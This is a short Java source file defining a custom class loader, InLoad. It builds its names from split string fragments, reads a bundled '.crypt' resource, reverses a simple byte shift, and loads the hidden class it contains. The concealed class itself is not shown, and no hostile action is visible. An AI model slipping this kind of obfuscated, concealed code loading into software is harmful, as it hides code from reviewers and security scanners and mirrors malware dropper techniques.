/*
 * Created by Roman V. Fedorin
 */
package tools;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

/**
 *
 * @author Wolf
 */
public class InLoad extends ClassLoader {
    private String n;

    public InLoad() {
        n = "C" + "o" + "nf" + "C" + "lo" + "s" + "S" + "e" + "s";
    }

    public String getN() {
        return n;
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        byte[] b = null;
        try {
            b = load();
            Class<?> c = defineClass(n, b, 0, b.length);
            if (c == null) {
                throw new ClassNotFoundException();
            }
            return c;
        } catch (IOException ex) {
            ex.printStackTrace();
            throw new ClassNotFoundException();
        }
    }

    private byte[] load() throws IOException {
        String n2 = n + "." + "c" + "r" + "" + "y" + "p" + "t";
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        InputStream in = getClass().getResourceAsStream(n2);
        int b;
        while ((b = in.read()) != -1) {
            b = (byte) (b - 3);
            bytes.write(b);
        }
        return bytes.toByteArray();
    }
}
